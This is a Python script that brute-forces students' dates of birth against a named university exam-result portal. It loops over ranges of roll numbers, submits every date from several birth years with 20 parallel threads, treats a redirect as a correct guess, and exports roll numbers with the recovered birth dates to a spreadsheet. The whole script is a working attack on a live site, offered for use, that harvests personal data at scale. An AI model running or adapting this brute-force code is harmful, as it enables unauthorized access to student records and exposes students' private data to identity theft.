import requests
import re
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
import pandas as pd
import time

# Years grouped according to your logic
year_groups = [
    [2006, 2007, 2008],
    [2003, 2004, 2005],
    [2000, 2001, 2002, 2009, 2010]
]

# Target URL
url = "https://ddugorakhpur.com/result2023/searchresult_new.aspx"

# Function to try a single date
def try_date(session, roll_no, semester, date_of_birth, max_retries=3):
    for attempt in range(1, max_retries + 1):
        try:
            # Get initial page
            response = session.get(url, timeout=10)

            # Extract hidden fields
            viewstate = re.search(r'id="__VIEWSTATE" value="([^"]+)"', response.text).group(1)
            eventvalidation = re.search(r'id="__EVENTVALIDATION" value="([^"]+)"', response.text).group(1)
            viewstategenerator = re.search(r'id="__VIEWSTATEGENERATOR" value="([^"]+)"', response.text).group(1)

            # Prepare form data
            form_data = {
                "__VIEWSTATE": viewstate,
                "__VIEWSTATEGENERATOR": viewstategenerator,
                "__EVENTVALIDATION": eventvalidation,
                "ddlsem": semester,
                "txtRollno": roll_no,
                "txtDob": date_of_birth,
                "btnSearch": "Search Result"
            }

            # Submit form
            post_response = session.post(url, data=form_data, allow_redirects=False, timeout=10)

            # Redirect means success
            return post_response.status_code == 302

        except Exception as e:
            if attempt < max_retries:
                time.sleep(1)  # Wait a little before retry
                continue  # Retry
            else:
                return False  # After max retries, give up

# Function to try all dates for one roll number
def find_dob_for_roll(roll_no, semester):
    session = requests.Session()
    
    # Total dates to try (needed for inner tqdm)
    all_dates = []
    for group in year_groups:
        for year in group:
            for month in range(1, 13):
                start_date = datetime(year, month, 1)
                end_date = (start_date.replace(month=month % 12 + 1, day=1) - timedelta(days=1)) if month != 12 else datetime(year, 12, 31)
                current_date = start_date
                while current_date <= end_date:
                    all_dates.append(current_date.strftime('%Y-%m-%d'))
                    current_date += timedelta(days=1)

    # Outer loop for year groups
    for group in year_groups:
        group_dates = [d for d in all_dates if int(d.split("-")[0]) in group]

        with tqdm(total=len(group_dates), desc=f"Roll {roll_no} Progress", leave=False, colour="cyan", bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]') as inner_bar:
            with ThreadPoolExecutor(max_workers=20) as executor:
                futures = {executor.submit(try_date, session, roll_no, semester, date): date for date in group_dates}

                for future in as_completed(futures):
                    inner_bar.update(1)
                    if future.result():
                        return futures[future]  # Return the correct date if found

    return "N.A"  # If nothing found

def main():
    print("DDU Result Portal DOB Finder - Fancy Version ✨")
    print("--------------------------------------------")

    start_roll = int(input("Enter starting Roll Number: "))
    end_roll = int(input("Enter ending Roll Number: "))
    semester = input("Enter Semester (1-8): ")

    results = []

    # Main progress bar for roll numbers
    with tqdm(total=end_roll - start_roll + 1, desc="Processing Roll Numbers", colour="green", bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]') as main_bar:
        for roll_no in range(start_roll, end_roll + 1):
            dob = find_dob_for_roll(roll_no, semester)
            results.append({"Roll Number": roll_no, "Date of Birth": dob})
            main_bar.update(1)

    # Save to Excel
    df = pd.DataFrame(results)
    df.to_excel("roll_number_dob_results.xlsx", index=False)
    print("\n✅ Results saved to 'roll_number_dob_results.xlsx'")

if __name__ == "__main__":
    main()
